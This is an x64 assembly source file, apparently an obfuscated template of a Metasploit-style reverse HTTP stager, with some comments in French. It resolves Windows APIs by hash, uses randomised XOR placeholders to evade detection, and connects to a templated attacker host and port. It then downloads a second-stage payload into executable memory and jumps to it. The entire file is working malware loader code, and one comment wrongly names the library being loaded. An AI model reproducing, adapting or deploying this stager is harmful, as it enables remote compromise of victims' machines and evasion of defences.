_start:
    cld
    and rsp,byte -0x10
    call save_beginning

metasploit_block_api:
    push r9
    push r8
    xor rax,rax
    mov rax,0xff
    push rdx
    xor rdx,rdx
    xor rax,0x9f
    mov rax,[gs:rax] ; 0x60
    xor rax,%RANDOM__1%
    push rcx
    mov rdx,rax
    xor rdx,%RANDOM__1%
    mov rdx,[rdx+0x18]
    xor rdx,rax
    push rsi
    xor rdx,rax
    nop
    mov rdx,[rdx+0x20]

load_module_name:
    mov rsi,[rdx+0x50]
    xor r9,r9
    movzx rcx, word [rdx+0x4a]

module_hash_loop:
    xor rax,rax
    lodsb
    cmp al,0x61
    jl skip_case_adjustment
    sub al,0x20
skip_case_adjustment:
    ror r9d,%ROR_VALUE%
    add r9d,eax
    nop
    loop module_hash_loop

is_valid_module:
    push rdx
    push r9
    mov rdx,[rdx+0x20]
    mov eax,[rdx+0x3c]
    add rax,rdx
    cmp word [rax+0x18],0x20b
    jnz load_next_module

    mov eax,[rax+0x88]  ; offset de IMAGE_EXPORT_DIRECTORY
    test rax,rax
    jz load_next_module

    add rax,rdx
    mov r8d,[rax+0x20]
    mov ecx,[rax+0x18]
    push rax            ; On sauvegarde l'adresse de IMAGE_EXPORT_DIRECTORY
    add r8,rdx

find_function:
    jrcxz pre_load_next_module
    dec rcx
    xor r9,r9
    mov esi,[r8+rcx*4]
    add rsi,rdx

function_hash_loop:
    xor rax,rax
    ror r9d,%ROR_VALUE%
    lodsb
    add r9d,eax
    cmp al,ah
    jnz function_hash_loop

check:
    add r9,[rsp+0x8]
    cmp r9d,r10d
    jnz find_function

final:
    pop rax
    mov r8d,[rax+0x24]
    add r8,rdx
    mov cx,[r8+rcx*2]
    mov r8d,[rax+0x1c]
    add r8,rdx
    mov eax,[r8+rcx*4]
    add rax,rdx
    xor rax,%RANDOM__2%
    pop r8
    pop r8
    pop rsi
    pop rcx
    pop rdx
    pop r8
    pop r9
    pop r10
    sub rsp,byte 0x20
    push r10
    xor rax,%RANDOM__2%
    jmp rax

pre_load_next_module:
    pop rax
load_next_module:
    pop r9
    pop rdx
    mov rdx,[rdx]
    jmp load_module_name


save_beginning:
    pop rbp
    xor rbx,rbx
    push rbx
    mov r14,0x74656e696e6977 ; Chaine de caractere "wininet"
    push r14
    mov rcx,rsp
    mov r10,%HASH__kernel32.dll__LoadLibraryA% ; kernel32.LoadLibraryA("ws2_32")
    call rbp
    push rbx
    push rbx
    call to_rename_17c
    db `%USER-AGENT%\0`

to_rename_17c:
    pop rcx
    pop rbx
    pop rdx
    xor r8,r8
    xor r9,r9
    push rbx
    push rbx
    mov r10,%HASH__wininet.dll__InternetOpenA% ; wininet.InternetOpenA()
    call rbp
    call to_rename_1a5
    db `%RHOST%\0`

to_rename_1a5:
    pop rdx
    mov rcx,rax
    mov r8,%RPORT%
    xor r9,r9
    push rbx
    push rbx
    push byte 0x3
    push rbx
    mov r10,%HASH__wininet.dll__InternetConnectA% ; wininet.InternetConnectA()
    call rbp
    call to_rename_29f
    db `/BOrVVpMcxVd5BHgGHrp5Ugqy9lv_X8u7KkEtP-vi-hjOv_HN9WvuZ3ryuy8IcOiPcblYiDEmz4WCDoX1wp6Cb7M7Z6cv1XT0aToXDcSFOS9DFhDuWRltirbshEL1QtSDY1yFdu-m4Y8Trgn6oIjV8KoSLw9aBThG0VcrrphUfBXTqUyzDwFO0y-1JsWYnrgPve45LMKr4y9xvxzotKwi\0`

to_rename_29f:
    mov rcx,rax
    push rbx
    pop rdx
    pop r8
    xor r9,r9
    push rbx
    mov rax,%HASH__wininet.dll__InternetConnectA% ; wininet.InternetConnectA()
    push rax
    push rbx
    push rbx
    mov r10,%HASH__wininet.dll__HttpOpenRequestA% ; wininet.HttpOpenRequestA()
    call rbp
    mov rsi,rax
    push byte 0xa
    pop rdi
    mov rcx,rsi
    push byte 0x1f
    pop rdx
    push rdx
    push qword 0x3380
    mov r8,rsp
    push byte 0x4
    pop r9
    mov r10,%HASH__wininet.dll__InternetSetOptionA% ; wininet.InternetSetOptionA()
    call rbp
    xor r8,r8
    push rbx
    pop rdx
    mov rcx,rsi
    xor r9,r9
    xor r9,r9
    push rbx
    push rbx
    mov r10,%HASH__wininet.dll__HttpSendRequestA% ; wininet.HttpSendRequestA()
    call rbp
    test eax,eax
    jnz to_rename_321
    mov rcx,0x1388
    mov r10,%HASH__kernel32.dll__Sleep% ; kernel32.Sleep()
    call rbp
    dec rdi
    jz to_rename_31c
    jmp 0xffffffffffffffac

to_rename_31c:
    call to_rename_376

to_rename_321:
    push rbx
    pop rcx
    push byte 0x40
    pop rdx
    mov r9,rdx
    shl edx,byte 0x10
    mov r8,0x1000
    mov r10,%HASH__kernel32.dll__VirtualAlloc% ; kernel32.VirtualAlloc()
    call rbp
    xchg rax,rbx
    push rbx
    push rbx
    mov rdi,rsp

to_rename_346:
    mov rcx,rsi
    mov rdx,rbx
    mov r8,0x2000
    mov r9,rdi
    mov r10,%HASH__wininet.dll__InternetReadFile% ; wininet.InternetReadFile()
    call rbp
    add rsp,byte 0x20
    test eax,eax
    jz to_rename_31c
    mov ax,[rdi]
    add rbx,rax
    test eax,eax
    jnz to_rename_346
    pop rax
    ret

to_rename_376:
    pop rax
    push byte 0x0
    pop rcx
    mov r10,%HASH__kernel32.dll__ExitProcess%   ; Hash de kernel32.ExitProcess
    call rbp
